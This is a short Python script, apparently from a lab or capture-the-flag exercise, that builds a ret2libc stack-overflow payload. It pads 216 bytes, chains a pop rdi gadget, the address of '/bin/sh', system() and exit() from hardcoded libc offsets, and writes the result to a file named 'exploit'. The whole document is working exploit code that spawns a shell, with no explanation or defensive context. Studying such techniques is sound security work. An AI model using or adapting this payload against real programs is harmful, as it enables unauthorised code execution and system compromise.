import sys 
import struct

libc_base_address = 0x00007ffff7de5000
ret = libc_base_address +  0x000000000002637f
pop_rdi = libc_base_address + 0x0000000000027c3d
bin_sh = libc_base_address + 0x198882   
system_function = libc_base_address + 0x0000000000049860
exit_function = libc_base_address + 0x000000000003f100


buf = b"A" * 216
#buf += struct.pack('<Q', ret)
buf += struct.pack('<Q', pop_rdi) # pop rdi ; ret
buf += struct.pack('<Q', bin_sh) #/bin/sh
buf += struct.pack('<Q', system_function) # system()
buf += struct.pack('<Q', exit_function) # exit()

fd = open("exploit", "wb")
fd.write(buf)
